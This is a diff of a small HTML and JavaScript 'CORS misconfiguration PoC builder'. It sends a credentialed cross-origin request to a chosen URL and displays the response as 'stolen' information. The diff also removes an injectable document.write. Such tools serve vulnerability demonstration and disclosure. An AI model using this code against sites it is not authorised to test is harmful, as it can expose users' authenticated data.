@@ -3,13 +3,38 @@
 <head>
 <title>CORS POC builder</title>
 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
-<script>
+
+</head>
+
+<body>
+
+<div class="container">
+<br/>
+<h2>CORS misconfiguration POC Builder</h2>
+<p>
+This is a PoC to demonstrate a CORS misconfiguration vulnerability on <code id="url"></code>.
+</p>
+<h2>Settings</h2>
+<pre>
+<form id="settings" name="settings">
+URL: <input type="text" placeholder="https://example.com" name="url" size="100"><br />
+<input type="checkbox" name="authenticated"/> Send CORS with authentication cookies<br />
+<button id="btn-send" class="btn btn-info">Send CORS request</button>
+</form>
+</pre>
+<hr />
+<p>Any information returned due to a lax CORS policy will be printed below:</p>
+<div class="alert alert-info" id="stolen-info"></div>
+
+<div id="footer"><center><hr /><p class="small">Created with &hearts; by <a href="https://twitter.com/honoki">@honoki</a></p></center></div>
+</div>
+ <script>
 
 var config = {}
 
 // Config
 function parseConfig() {
- var decoded = atob(document.location.hash.substr(1));
+ var decoded = atob(document.location.hash.substr(1)) || '{}';
  try {
   config = JSON.parse(decoded);
   
@@ -37,7 +62,8 @@ function saveConfig() {
   parseConfig();
 }
 
-function sendCORS() {
+function sendCORS(e) {
+  e.preventDefault()
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
@@ -47,32 +73,12 @@ function sendCORS() {
   xhttp.open("GET", url, true);
   xhttp.withCredentials = config.authenticated;
   xhttp.send();
+  return false;
 }
+
+document.getElementById('settings').addEventListener('change', saveConfig);
+document.getElementById('btn-send').addEventListener('click', sendCORS);
+parseConfig();
 </script>
-</head>
-
-<body onload="parseConfig();">
-
-<div class="container">
-<br/>
-<h2>CORS misconfiguration POC Builder</h2>
-<p>
-This is a PoC to demonstrate a CORS misconfiguration vulnerability on <code id="url"><script>document.write(config.url);</script></code>.
-</p>
-<h2>Settings</h2>
-<pre>
-<form name="settings" onchange="saveConfig();">
-URL: <input type="text" placeholder="https://example.com" name="url" size="100"><br />
-<input type="checkbox" name="authenticated"/> Send CORS with authentication cookies<br />
-<button class="btn btn-info" onclick="sendCORS();return false;">Send CORS request</button>
-</form>
-</pre>
-<hr />
-<p>Any information returned due to a lax CORS policy will be printed below:</p>
-<div class="alert alert-info" id="stolen-info"></div>
-
-<div id="footer"><center><hr /><p class="small">Created with &hearts; by <a href="https://twitter.com/honoki">@honoki</a></p></center></div>
-</div>
 </body>
-
 </html>
